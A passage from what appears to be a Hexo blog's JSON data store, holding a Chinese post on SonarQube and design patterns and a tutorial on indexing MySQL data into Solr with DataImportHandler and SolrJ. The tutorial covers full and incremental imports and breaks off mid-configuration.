&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;</h4><p>&#x90A3;&#x4E48;&#x600E;&#x4E48;&#x624D;&#x80FD;&#x4F18;&#x96C5;&#x7684;&#x638C;&#x63E1;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x5450;&#xFF0C;&#x60F3;&#x6765;&#x60F3;&#x53BB;&#xFF0C;&#x6211;&#x7684;&#x65B9;&#x6CD5;&#x662F;&#x5148;&#x4E86;&#x89E3;&#x5B83;&#x7684;&#x5404;&#x79CD;&#x4F7F;&#x7528;&#xFF0C;&#x77E5;&#x9053;&#x5B83;&#x7684;&#x5B58;&#x5728;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x5177;&#x4F53;&#x7684;&#x4F7F;&#x7528;&#x5C42;&#x9762;&#x4E0A;&#x53EA;&#x662F;&#x501F;&#x9274;&#x5B83;&#x3002;&#x5982;&#x679C;&#x4F60;&#x5BF9;&#x4EE3;&#x7801;&#x6709;&#x9AD8;&#x8981;&#x6C42;&#xFF0C;&#x5728;&#x4EFB;&#x4F55;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x90FD;&#x4F1A;&#x52AA;&#x529B;&#x53BB;&#x63D0;&#x9AD8;&#x4EE3;&#x7801;&#x7684;&#x53EF;&#x8BFB;&#x6027;&#xFF0C;&#x90FD;&#x4F1A;&#x53BB;&#x63A7;&#x5236;&#x4F60;&#x7684;&#x4EE3;&#x7801;&#x91CF;&#x3001;&#x51CF;&#x5C11;&#x5D4C;&#x5957;&#x4E0E;&#x5FAA;&#x73AF;&#x3001;&#x51CF;&#x5C11;&#x5404;&#x79CD;&#x6F5C;&#x5728;&#x98CE;&#x9669;&#x65F6;&#xFF0C;&#x6211;&#x60F3;&#x65F6;&#x95F4;&#x957F;&#x4E86;&#xFF0C;&#x65E0;&#x5E08;&#x81EA;&#x901A;&#xFF0C;&#x81EA;&#x6709;&#x4E00;&#x756A;&#x98CE;&#x666F;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%BB%8ESonarQube%E8%B0%88%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/1.png\" alt=\"&#x9879;&#x76EE;&#x91CD;&#x6784;&#xFF08;&#x4F18;&#x5316;&#xFF09;&#x539F;&#x5219;\"></p>\n","excerpt":"<h4 id=\"SonarQube\"><a href=\"#SonarQube\" class=\"headerlink\" title=\"SonarQube\"></a>SonarQube</h4><p>SonarQube&#x662F;&#x7528;&#x6765;&#x68C0;&#x6D4B;&#x4EE3;&#x7801;&#x8D28;&#x91CF;&#x7684;&#xFF0C;&#x4F46;&#x7C7B;&#x4F3C;&#x5DE5;&#x5177;&#x7684;&#x63A8;&#x5E7F;&#x5E38;&#x5E38;&#x9047;&#x5230;&#x963B;&#x788D;&#x3002;</p>\n<p>&#x6210;&#x578B;&#x9879;&#x76EE;&#x6216;&#x50F5;&#x5C38;&#x9879;&#x76EE;&#x53EF;&#x4EE5;&#x7406;&#x89E3;&#xFF0C;&#x9879;&#x76EE;&#x4F18;&#x5316;&#x9700;&#x8981;&#x6295;&#x5165;&#x7684;&#x4EBA;&#x529B;&#x6210;&#x672C;&#x548C;&#x65F6;&#x95F4;&#x6210;&#x672C;&#x592A;&#x5927;&#xFF0C;&#x800C;&#x4E14;&#x6700;&#x4E3B;&#x8981;&#x7684;&#x662F;&#x65E0;&#x6CD5;&#x4FDD;&#x8BC1;&#x6539;&#x52A8;&#x8FC7;&#x7A0B;&#x4E2D;&#x4E0D;&#x5F15;&#x5165;&#x65B0;&#x7684;bug&#x3002;&#x90A3;&#x4E48;&#x5927;&#x5BB6;&#x4F1A;&#x60F3;&#xFF0C;&#x5728;&#x9879;&#x76EE;&#x7ACB;&#x9879;&#x521D;&#x671F;&#x914D;&#x5408;&#x4F7F;&#x7528;&#xFF0C;&#x8FD9;&#x5E94;&#x8BE5;&#x6CA1;&#x4EC0;&#x4E48;&#x95EE;&#x9898;&#x4E86;&#x5427;&#xFF1F;&#x5948;&#x4F55;&#x7406;&#x7531;&#x8FD9;&#x4E1C;&#x897F;&#xFF0C;&#x53EA;&#x8981;&#x60F3;&#x627E;&#xFF0C;&#x603B;&#x662F;&#x6709;&#x7684;&#x3002;&#x6BD5;&#x7ADF;&#x5927;&#x5BB6;&#x90FD;&#x559C;&#x6B22;&#x5F85;&#x5728;&#x8212;&#x9002;&#x533A;&#xFF0C;&#x4E0D;&#x559C;&#x6B22;&#x6298;&#x817E;&#x3002;&#x8BD5;&#x60F3;&#x521A;&#x63D0;&#x4EA4;&#x5B8C;&#x4EE3;&#x7801;&#x6CA1;&#x591A;&#x4E45;&#xFF0C;&#x90AE;&#x4EF6;&#x5C31;&#x63D0;&#x9192;&#x4F60;&#x9700;&#x8981;&#x4F18;&#x5316;&#xFF0C;&#x6253;&#x5F00;&#x4E00;&#x770B;&#xFF0C;&#x539F;&#x6765;&#x53C8;&#x662F;for&#x5FAA;&#x73AF;&#x592A;&#x591A;&#x3001;&#x5D4C;&#x5957;&#x592A;&#x591A;&#x3001;&#x91CD;&#x590D;&#x4EE3;&#x7801;&#x592A;&#x591A;&#x6216;&#x8005;&#x65B9;&#x6CD5;&#x884C;&#x6570;&#x592A;&#x591A;&#x3002;why&#xFF1F;&#x6211;&#x5B9E;&#x73B0;&#x529F;&#x80FD;&#x4E0D;&#x5C31;&#x884C;&#x4E86;&#x5417;&#xFF1F;&#x65F6;&#x95F4;&#x8FD9;&#x4E48;&#x7D27;&#x8FEB;&#xFF0C;&#x600E;&#x4E48;&#x6709;&#x65F6;&#x95F4;&#x4FEE;&#x6539;&#x8FD9;&#x79CD;&#x95EE;&#x9898;&#x5462;&#xFF1F;&#x8FDE;&#x8FD9;&#x4E9B;&#x5C0F;&#x95EE;&#x9898;&#x90FD;&#x6293;&#x4F4F;&#x4E0D;&#x653E;&#xFF1F;&#x5475;&#x5475;&#xFF0C;&#x4EE5;&#x540E;&#x6709;&#x65F6;&#x95F4;&#x4E00;&#x5B9A;&#x6539;&#x3002;</p>\n<p>&#x6211;&#x8D77;&#x521D;&#x4E5F;&#x8FD9;&#x4E48;&#x60F3;&#x7684;&#xFF0C;&#x867D;&#x7136;&#x77E5;&#x9053;&#x597D;&#x7684;&#x4E60;&#x60EF;&#x517B;&#x6210;&#x5F88;&#x91CD;&#x8981;&#xFF0C;&#x4F46;&#x8FD8;&#x662F;&#x907F;&#x514D;&#x4E0D;&#x4E86;&#x6709;&#x6240;&#x62B5;&#x89E6;&#x3002;&#x4E0D;&#x8FC7;&#x597D;&#x5728;&#x4E0A;&#x5934;&#x89C4;&#x5B9A;&#x76F8;&#x5173;&#x7C7B;&#x578B;bug&#x5FC5;&#x987B;&#x6E05;&#x96F6;&#xFF0C;&#x575A;&#x6301;&#x7684;&#x65F6;&#x95F4;&#x4E00;&#x957F;&#xFF0C;&#x6536;&#x83B7;&#x8FD8;&#x662F;&#x86EE;&#x5927;&#xFF0C;&#x6700;&#x76F4;&#x63A5;&#x7684;&#x4F53;&#x73B0;&#x5C31;&#x662F;&#x4EE3;&#x7801;&#x6613;&#x8BFB;&#x6027;&#x52A0;&#x5F3A;&#x4E86;&#x3002;&#x8FD9;&#x4E2A;&#x65F6;&#x5019;&#x6211;&#x7A81;&#x7136;&#x5C31;&#x60F3;&#x8D77;&#x4E86;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x3002;</p>\n<h4 id=\"&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;\"><a href=\"#&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;\" class=\"headerlink\" title=\"&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;\"></a>&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;</h4><p>&#x81EA;&#x5927;&#x4E8C;&#x63A5;&#x89E6;Java&#x4EE5;&#x6765;&#xFF0C;&#x5C31;&#x77E5;&#x9053;IT&#x754C;&#x6709;&#x4E00;&#x79CD;&#x65E0;&#x4E0A;&#x529F;&#x6CD5;&#x53EB;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#xFF0C;&#x7136;&#x540E;&#x5C31;&#x4E00;&#x76F4;&#x60F3;&#x7740;&#x54EA;&#x5929;&#x80FD;&#x878D;&#x4F1A;&#x8D2F;&#x901A;&#xFF0C;&#x6325;&#x624B;&#x95F4;&#xFF0C;&#x5C31;&#x662F;&#x4E00;&#x7247;&#x9526;&#x7EE3;&#x4EE3;&#x7801;&#x3002;<br></p>","more":"<br>&#x53EF;&#x662F;&#x8FD9;&#x4E9B;&#x5E74;&#x8FC7;&#x53BB;&#xFF0C;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x7ED9;&#x6211;&#x7684;&#x611F;&#x89C9;&#x5C31;&#x662F;&#x9065;&#x4E0D;&#x53EF;&#x53CA;&#xFF0C;&#x4EFF;&#x4F5B;&#x5B83;&#x53EA;&#x5B58;&#x5728;&#x4E8E;&#x9762;&#x8BD5;&#x9898;&#x4E2D;&#xFF0C;&#x800C;&#x4E14;&#x5947;&#x602A;&#x7684;&#x662F;&#x5927;&#x5BB6;&#x95F2;&#x65F6;&#x8C08;&#x8BBA;&#x6280;&#x672F;&#x4E5F;&#x5F88;&#x5C11;&#x6D89;&#x53CA;&#xFF0C;why? &#x9996;&#x5148;&#x81EA;&#x6211;&#x53CD;&#x601D;&#xFF0C;&#x90A3;&#x662F;&#x81EA;&#x8EAB;&#x6C34;&#x5E73;&#x4E0D;&#x884C;&#xFF0C;get&#x4E0D;&#x5230;&#x6838;&#x5FC3;&#xFF0C;&#x4F46;&#x6211;&#x76F8;&#x4FE1;&#x8FD9;&#x4E0D;&#x662F;&#x5168;&#x90E8;&#x539F;&#x56E0;&#x3002;<p></p>\n<p>&#x6211;&#x8BA4;&#x4E3A;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x7684;&#x51FA;&#x73B0;&#x662F;&#x4E3A;&#x4E86;&#x66F4;&#x597D;&#x7684;&#x5199;&#x597D;&#x4EE3;&#x7801;&#xFF0C;&#x5B83;&#x53EA;&#x662F;&#x624B;&#x6BB5;&#xFF0C;&#x4E0D;&#x662F;&#x76EE;&#x7684;&#x3002;&#x5948;&#x4F55;&#x8FD9;&#x7CFB;&#x5217;&#x624B;&#x6BB5;&#x592A;&#x9AD8;&#x660E;&#xFF0C;&#x5B8C;&#x5168;&#x4E0D;&#x662F;&#x521D;&#x7EA7;&#x83DC;&#x9E1F;&#x7684;&#x83DC;&#x3002;&#x521D;&#x7EA7;&#x83DC;&#x9E1F;&#x6CA1;&#x638C;&#x63E1;&#xFF0C;&#x90A3;&#x5927;&#x795E;&#x7EA7;&#x522B;&#x7684;&#x5E73;&#x5E38;&#x4E3A;&#x4EC0;&#x4E48;&#x4E5F;&#x4E0D;&#x600E;&#x4E48;&#x8C08;&#x8BBA;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x5462;&#xFF1F;&#x6211;&#x60F3;&#xFF0C;&#x53EF;&#x80FD;&#x662F;&#x56E0;&#x4E3A;&#x4E0D;&#x540C;&#x5C42;&#x7EA7;&#x7684;&#x4EBA;&#xFF0C;&#x5982;&#x679C;&#x7528;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x91CC;&#x9762;&#x7684;&#x903C;&#x683C;&#x540D;&#x8BCD;&#x8C08;&#x8BBA;&#xFF0C;&#x6839;&#x672C;&#x5C31;&#x65E0;&#x6CD5;&#x6C9F;&#x901A;&#xFF0C;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x5E73;&#x5E38;&#x662F;&#x8FD9;&#x4E48;&#x8BA8;&#x8BBA;&#x7684;&#xFF1A;</p>\n<ul>\n<li>&#x8FD9;&#x4E2A;&#x7C7B;&#x8D1F;&#x8D23;&#x521B;&#x5EFA;&#x8FD9;&#x4E2A;&#x5BF9;&#x8C61;&#xFF0C;&#x5BF9;&#x3002;&#x7136;&#x540E;&#x8FD9;&#x8FB9;&#x5305;&#x88C5;&#x4E00;&#x4E0B;&#xFF0C;&#x5BF9;&#x7684;&#x3002;</li>\n<li>&#x55EF;&#xFF0C;&#x4F60;&#x8FD9;&#x4E2A;&#x7C7B;&#x5C31;&#x662F;&#x9488;&#x5BF9;&#x4ED6;&#x7684;Interface&#x505A;&#x7684;&#x4E00;&#x4E2A;Adapter&#xFF0C;&#x662F;&#x7684;&#x3002;</li>\n<li>&#x4F60;&#x8FD9;&#x4E2A;&#x53EA;&#x521B;&#x5EFA;&#x4E00;&#x6B21;&#xFF0C;&#x63D0;&#x9AD8;&#x6027;&#x80FD;&#x3002;&#x54E6;&#xFF0C;&#x5BF9;&#xFF0C;&#x6CA1;&#x9519;&#xFF0C;&#x4F46;&#x8FD9;&#x6837;&#x66F4;&#x597D;&#xFF0C;balabala&#x2026;</li>\n</ul>\n<p>&#x6240;&#x4EE5;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x5927;&#x90E8;&#x5206;&#x60C5;&#x51B5;&#x4E0B;&#x53EA;&#x662F;&#x7ED9;&#x5927;&#x5BB6;&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x6761;&#x5FEB;&#x901F;&#x63D0;&#x5347;&#x903C;&#x683C;&#x7684;&#x9014;&#x5F84;&#xFF0C;&#x8981;&#x662F;&#x6CA1;&#x6709;&#x65F6;&#x95F4;&#x4E0A;&#x7684;&#x79EF;&#x7D2F;&#xFF0C;&#x5C31;&#x7B97;&#x628A;&#x6240;&#x6709;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x7684;&#x540D;&#x5B57;&#x90FD;&#x80CC;&#x4E0B;&#x6765;&#xFF0C;&#x53EF;&#x80FD;&#x8FD8;&#x662F;&#x4E0D;&#x592A;&#x4F1A;&#x7528; 0.0</p>\n<h4 id=\"SonarQube-amp-&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;\"><a href=\"#SonarQube-amp-&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;\" class=\"headerlink\" title=\"SonarQube &amp; &#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;\"></a>SonarQube &amp; &#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;</h4><p>&#x90A3;&#x4E48;&#x600E;&#x4E48;&#x624D;&#x80FD;&#x4F18;&#x96C5;&#x7684;&#x638C;&#x63E1;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x5450;&#xFF0C;&#x60F3;&#x6765;&#x60F3;&#x53BB;&#xFF0C;&#x6211;&#x7684;&#x65B9;&#x6CD5;&#x662F;&#x5148;&#x4E86;&#x89E3;&#x5B83;&#x7684;&#x5404;&#x79CD;&#x4F7F;&#x7528;&#xFF0C;&#x77E5;&#x9053;&#x5B83;&#x7684;&#x5B58;&#x5728;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x5177;&#x4F53;&#x7684;&#x4F7F;&#x7528;&#x5C42;&#x9762;&#x4E0A;&#x53EA;&#x662F;&#x501F;&#x9274;&#x5B83;&#x3002;&#x5982;&#x679C;&#x4F60;&#x5BF9;&#x4EE3;&#x7801;&#x6709;&#x9AD8;&#x8981;&#x6C42;&#xFF0C;&#x5728;&#x4EFB;&#x4F55;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x90FD;&#x4F1A;&#x52AA;&#x529B;&#x53BB;&#x63D0;&#x9AD8;&#x4EE3;&#x7801;&#x7684;&#x53EF;&#x8BFB;&#x6027;&#xFF0C;&#x90FD;&#x4F1A;&#x53BB;&#x63A7;&#x5236;&#x4F60;&#x7684;&#x4EE3;&#x7801;&#x91CF;&#x3001;&#x51CF;&#x5C11;&#x5D4C;&#x5957;&#x4E0E;&#x5FAA;&#x73AF;&#x3001;&#x51CF;&#x5C11;&#x5404;&#x79CD;&#x6F5C;&#x5728;&#x98CE;&#x9669;&#x65F6;&#xFF0C;&#x6211;&#x60F3;&#x65F6;&#x95F4;&#x957F;&#x4E86;&#xFF0C;&#x65E0;&#x5E08;&#x81EA;&#x901A;&#xFF0C;&#x81EA;&#x6709;&#x4E00;&#x756A;&#x98CE;&#x666F;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%BB%8ESonarQube%E8%B0%88%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/1.png\" alt=\"&#x9879;&#x76EE;&#x91CD;&#x6784;&#xFF08;&#x4F18;&#x5316;&#xFF09;&#x539F;&#x5219;\"></p>"},{"title":"使用Solr索引MySQL数据","date":"2016-07-03T13:18:00.000Z","toc":false,"_content":"\n\n### 环境搭建\n1、到apache下载solr，地址：http://mirrors.hust.edu.cn/apache/lucene/solr/\n2、解压到某个目录\n3、cd into D:\\Solr\\solr-4.10.3\\example\n4、Execute the server by “java -jar startup.jar”Solr会自动运行在自带的Jetty上\n5、访问http://localhost:8983/solr/#/\n\nPS：solr-5.0 以上默认对schema的管理是使用managed-schema，不能手动修改，需要使用Schema Restful的API操作。如果要想手动修改配置，把managed-schema拷贝一份修改为schema.xml，在solrconfig.xml中修改如下：\n\n```bash\n<!-- <schemaFactory class=\"ManagedIndexSchemaFactory\">\n    <bool name=\"mutable\">true</bool>\n    <str name=\"managedSchemaResourceName\">managed-schema</str>\n  </schemaFactory> -->\n  \n<!-- <processor class=\"solr.AddSchemaFieldsUpdateProcessorFactory\">\n      <str name=\"defaultFieldType\">strings</str>\n      <lst name=\"typeMapping\">\n        <str name=\"valueClass\">java.lang.Boolean</str>\n        <str name=\"fieldType\">booleans</str>\n      </lst>\n      <lst name=\"typeMapping\">\n        <str name=\"valueClass\">java.util.Date</str>\n        <str name=\"fieldType\">tdates</str>\n      </lst>\n      <lst name=\"typeMapping\">\n        <str name=\"valueClass\">java.lang.Long</str>\n        <str name=\"valueClass\">java.lang.Integer</str>\n        <str name=\"fieldType\">tlongs</str>\n      </lst>\n      <lst name=\"typeMapping\">\n\n\n        <str name=\"valueClass\">java.lang.Number</str>\n        <str name=\"fieldType\">tdoubles</str>\n      </lst>\n    </processor> -->\n    \n  <schemaFactory class=\"ClassicIndexSchemaFactory\"/>\n```\n\n<!-- more -->\n\n### 创建MySQL数据\n\nDataBase Name: mybatis\nTable Name: user\nDb.sql\n\n```bash\nSET FOREIGN_KEY_CHECKS=0;\n-- ----------------------------\n-- Table structure for `user`\n-- ----------------------------\nDROP TABLE IF EXISTS `user`;\n\nCREATE TABLE `user` (\n  `id` int(11) NOT NULL AUTO_INCREMENT,\n  `userName` varchar(50) DEFAULT NULL,\n  `userAge` int(11) DEFAULT NULL,\n  `userAddress` varchar(200) DEFAULT NULL,\n  PRIMARY KEY (`id`)\n) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;\n\n-- ----------------------------\n-- Records of user\n-- ----------------------------\nINSERT INTO `user` VALUES ('1', 'summer', '30', 'shanghai');\nINSERT INTO `user` VALUES ('2', 'test1', '22', 'suzhou');\nINSERT INTO `user` VALUES ('3', 'test1', '29', 'some place');\nINSERT INTO `user` VALUES ('4', 'lu', '28', 'some place');\nINSERT INTO `user` VALUES ('5', 'xiaoxun', '27', 'nanjing');\n```\n\n### 使用DataImportHandler导入并索引数据\n\n1） 配置D:\\Solr\\solr-4.10.3\\example\\solr\\collection1\\conf\\solrconfig.xml\n\n在<requestHandler name=\"/select\" class=\"solr.SearchHandler\">前面上加上一个dataimport的处理的Handler\n```bash\n<requestHandler name=\"/dataimport\" class=\"org.apache.solr.handler.dataimport.DataImportHandler\">\n　　     <lst name=\"defaults\">\n　　        <str name=\"config\">data-config.xml</str>\n　　     </lst>\n　　</requestHandler>\n```\n2） 在同目录下添加data-config.xml\n\n```bash\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<dataConfig>\n    <dataSource type=\"JdbcDataSource\" driver=\"com.mysql.jdbc.Driver\" url=\"jdbc:mysql://127.0.0.1:3306/mybatis\" user=\"root\" password=\"luxx\" batchSize=\"-1\" />\n　　<document name=\"testDoc\">\n        <entity name=\"user\" pk=\"id\"\n                query=\"select * from user\">\n　　　         <field column=\"id\" name=\"id\"/>\n　　　        <field column=\"userName\" name=\"userName\"/>\n            <field column=\"userAge\" name=\"userAge\"/>\n            <field column=\"userAddress\" name=\"userAddress\"/>\n　　　  </entity>\n　　</document>\n</dataConfig>\n```\n\n说明：\ndataSource是数据库数据源。\nEntity就是一张表对应的实体，pk是主键，query是查询语句。\nField对应一个字段，column是数据库里的column名，后面的name属性对应着Solr的Filed的名字。\n\n3） 修改同目录下的schema.xml，这是Solr对数据库里的数据进行索引的模式\n（1）保留_version_ 这个field\n（2）添加索引字段：这里每个field的name要和data-config.xml里的entity的field的name一样，一一对应。\n\n```bash\n<field name=\"id\" type=\"int\" indexed=\"true\" stored=\"true\" required=\"true\" multiValued=\"false\" />\n\n<!--<field name=\"id\" type=\"int\" indexed=\"true\" stored=\"true\" required=\"true\" multiValued=\"false\"/> -->\n\n<field name=\"userName\" type=\"text_general\" indexed=\"true\" stored=\"true\" />\n\n<field name=\"userAge\" type=\"int\" indexed=\"true\" stored=\"true\" />\n\n<field name=\"userAddress\" type=\"text_general\" indexed=\"true\" stored=\"true\" />\n```\n\n（3）删除多余的field，删除copyField里的设置，这些用不上。注意：text这个field不能删除，否则Solr启动失败。\n```bash\n<field name=\"text\" type=\"text_general\" indexed=\"true\" stored=\"false\" multiValued=\"true\"/>\n```\n\n（4）设置唯一主键：<uniqueKey>id</uniqueKey>，注意：Solr中索引的主键默认是只支持type=\"string\"字符串类型的，而我的数据库中id是int型的，会有问题，解决方法：修改同目录下的elevate.xml，注释掉下面2行，这貌似是Solr的Bug，原因不明。\n```bash\n<doc id=\"MA147LL/A\" />\n<doc id=\"IW-02\" exclude=\"true\" />\n```\n\n4）拷贝mysql-connector-java-5.1.22-bin.jar和solr-dataimporthandler-4.10.3.jar到D:\\Solr\\solr-4.10.3\\example\\solr-webapp\\webapp\\WEB-INF\\lib。一个是mysql的java驱动，另一个在D:\\Solr\\solr-4.10.3\\dist目录里，是org.apache.solr.handler.dataimport.DataImportHandler所在的jar。\n\n重启Solr。如果配置正确就可以启动成功。\n\nsolrconfig.xml是solr的基础文件，里面配置了各种web请求处理器、请求响应处理器、日志、缓存等。\nschema.xml配置映射了各种数据类型的索引方案。分词器的配置、索引文档中包含的字段也在此配置。\n\n### 索引测试\n\n进入Solr主页，在Core Selector中选择collection1：http://localhost:8983/solr/#/collection1\n\n点击Dataimport，Command选择full-import（默认），点击“Execute”，Refresh Status就可以看到结果：\nIndexing completed. Added/Updated: 7 documents.Deleted 0 documents.\nRequests: 1, Fetched: 7, Skipped: 0, Processed: 7\nStarted: 8 minutes ago\n\nQuery测试：在q中输入userName:test1进行检索就可以看到结果。\n这里使用full-import索引了配置数据库中的全部数据，使用Solr可以查询对应的数据。\n\n### 使用Solrj索引并检索数据\n\n上面是使用Solr Admin页面上的功能测试索引和检索，也可以使用代码来操作Solr，下面的代码测试了在Solr索引中添加了一个User类实体，并通过查找所有的index来返回结果。\n\nUser实体类：\n\n```bash\npackage com.mybatis.test.model;\n\nimport org.apache.solr.client.solrj.beans.Field;\n\npublic class User {\n\n    @Field\n    private int id;\n    \n    @Field\n    private String userName;\n    \n    @Field\n    private int userAge;\n    \n    @Field\n    private String userAddress;\n\n    public int getId() {\n        return id;\n    }\n\n    public void setId(int id) {\n        this.id = id;\n    }\n\n    public String getUserName() {\n        return userName;\n    }\n\n    public void setUserName(String userName) {\n        this.userName = userName;\n    }\n\n    public int getUserAge() {\n        return userAge;\n    }\n\n    public void setUserAge(int userAge) {\n        this.userAge = userAge;\n    }\n\n    public String getUserAddress() {\n        return userAddress;\n    }\n\n    public void setUserAddress(String userAddress) {\n        this.userAddress = userAddress;\n    }\n\n    @Override\n    public String toString() {\n        return this.userName + \" \" + this.userAge + \" \" + this.userAddress;\n    }\n\n}\n```\n\n使用@Field注解的属性要和Solr配置的Field对应。\n\n测试代码：\n\n```bash\npackage com.solr.test;\n\nimport java.io.IOException;\n\nimport org.apache.solr.client.solrj.SolrQuery;\nimport org.apache.solr.client.solrj.SolrServer;\nimport org.apache.solr.client.solrj.SolrServerException;\nimport org.apache.solr.client.solrj.impl.HttpSolrServer;\nimport org.apache.solr.client.solrj.response.QueryResponse;\nimport org.apache.solr.client.solrj.response.UpdateResponse;\nimport org.apache.solr.common.SolrDocumentList;\n\nimport com.mybatis.test.model.User;\n\npublic class SolrTest {\n    \n    private static SolrServer server;\n    \n    private static final String DEFAULT_URL = \"http://localhost:8983/solr/collection1\";\n    \n    public static void init() {\n        server = new HttpSolrServer(DEFAULT_URL);\n    }\n    \n    public static void indexUser(User user){\n        try {\n            //添加user bean到索引库\n            try {\n                UpdateResponse response = server.addBean(user);\n                server.commit();\n                System.out.println(response.getStatus());\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        } catch (SolrServerException e) {\n            e.printStackTrace();\n        } \n    }\n    \n    //测试添加一个新的bean实例到索引\n    public static void testIndexUser(){\n        User user = new User();\n        user.setId(8);\n        user.setUserAddress(\"place\");\n        user.setUserName(\"cdebcdccga\");\n        user.setUserAge(83);\n        \n        indexUser(user);\n    }\n    \n    public static void testQueryAll() {\n        SolrQuery params = new SolrQuery();\n        \n        // 查询关键词，*:*代表所有属性、所有值，即所有index\n        params.set(\"q\", \"*:*\");\n        \n        // 分页，start=0就是从0开始，rows=5当前返回5条记录，第二页就是变化start这个值为5就可以了。\n        params.set(\"start\", 0);\n        params.set(\"rows\", Integer.MAX_VALUE);\n            \n        // 排序，如果按照id排序，那么将score desc 改成 id desc(or asc)\n        // params.set(\"sort\", \"score desc\");\n        params.set(\"sort\", \"id asc\");\n        \n        // 返回信息*为全部，这里是全部加上score，如果不加下面就不能使用score\n        params.set(\"fl\", \"*,score\");\n        \n        QueryResponse response = null;\n        try {\n            response = server.query(params);\n        } catch (SolrServerException e) {\n            e.printStackTrace();\n        }\n        \n        if(response!=null){\n            System.out.println(\"Search Results: \");\n            SolrDocumentList list = response.getResults();\n            for (int i = 0; i < list.size(); i++) {\n                System.out.println(list.get(i));\n            }\n        }\n    }\n     \n    public static void main(String[] args) {\n        init();\n        //testIndexUser();\n        testQueryAll();\n    }\n}\n```\n\n如果在数据库中添加一条数据，但是Solr索引中没有index这条数据，就查不到，所以一般在使用Solr检索数据库里的内容时，都是先插入数据库，再在Solr中index这条数据，使用Solr的模糊查询或是分词功能来检索数据库里的内容。\n\n### DIH增量从MYSQL数据库导入数据\n已经学会了如何全量导入MySQL的数据，全量导入在数据量大的时候代价非常大，一般来说都会适用增量的方式来导入数据，下面介绍如何增量导入MYSQL数据库中的数据，以及如何设置定时来做。\n\n1）数据库表的更改\n\n前面已经创建好了一个User的表，这里为了能够进行增量导入，需要新增一个字段updateTime，类型为timestamp，默认值为CURRENT_TIMESTAMP。\n\n有了这样一个字段，Solr才能判断增量导入的时候，哪些数据是新的。\n\n因为Solr本身有一个默认值last_index_time，记录最后一次做full import或者是delta import(增量导入）的时间，这个值存储在文件conf目录的dataimport.properties文件中。\n\n2）data-config.xml中必要属性的设置\n\ntransformer 格式转化：HTMLStripTransformer 索引中忽略HTML标签\nquery：查询数据库表符合记录数据\ndeltaQuery：增量索引查询主键ID  注意这个只能返回ID字段   \ndeltaImportQuery：增量索引查询导入的数据 \ndeletedPkQuery：增量索引删除主键ID查询 注意这个只能返回ID字段   \n\n有关“query”，“deltaImportQuery”， “deltaQuery”的解释，引用官网说明，如下所示：\nThe query gives the data needed to populate fields of the Solr document in full-import\nThe deltaImportQuery gives the data needed to populate fields when running a delta-import\nThe deltaQuery gives the primary keys of the current entity which have changes since the last index time\n\n如果需要关联子表查询，可能需要用到parentDeltaQuery\nThe parentDeltaQuery uses the changed rows of the current table (fetched with deltaQuery) to give the changed rows in theparent table. This is necessary because whenever a row in the child table changes, we need to re-generate the document which has that field.\n\n更多说明看DeltaImportHandler的说明文档。\n\n针对User表，data-config.xml文件的配置内容如下：\n\n```bash\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<dataConfig>\n    <dataSource type=\"JdbcDataSource\" driver=\"com.mysql.jdbc.Driver\" url=\"jdbc:mysql://127.0.0.1:3306/mybatis\" user=\"root\" password=\"luxx\" batchSize=\"-1\" />\n　　<document name=\"testDoc\">\n        <entity name=\"user\" pk=\"id\"\n                query=\"select * from user\"\n                deltaImportQuery=\"select * from user where id='${dih.delta.id}'\"\n                deltaQuery=\"select id from user where updateTime> '${dataimporter.last_index_time}'\">\n　　　         <field column=\"id\" name=\"id\"/>\n　　　        <field column=\"userName\" name=\"userName\"/>\n            <field column=\"userAge\" name=\"userAge\"/>\n            <field column=\"userAddress\" name=\"userAddress\"/>\n<field column=\"updateTime\" name=\"updateTime\"/>\n　　　  </entity>\n　　</document>\n</dataConfig>\n```\n\n增量索引的原理是从数据库中根据deltaQuery指定的SQL语句查询出所有需要增量导入的数据的ID号。\n\n然后根据deltaImportQuery指定的SQL语句返回所有这些ID的数据，即为这次增量导入所要处理的数据。\n\n核心思想是：通过内置变量“${dih.delta.id}”和 “${dataimporter.last_index_time}”来记录本次要索引的id和最近一次索引的时间。\n\n注意：刚新加上的updateTime字段也要在field属性中配置，同时也要在schema.xml文件中配置：\n```bash\n<field name=\"updateTime\" type=\"date\" indexed=\"true\" stored=\"true\" />\n```\n\n如果业务中还有删除操作，可以在数据库中加一个isDeleted字段来表明该条数据是否已经被删除，这时候Solr在更新index的时候，可以根据这个字段来更新哪些已经删除了的记录的索引。\n\n这时候需要在dataConfig.xml中添加：\n```bash\nquery=\"select * from user where isDeleted=0\"\ndeltaImportQuery=\"select * from user where id='${dih.delta.id}'\"\ndeltaQuery=\"select id from user where 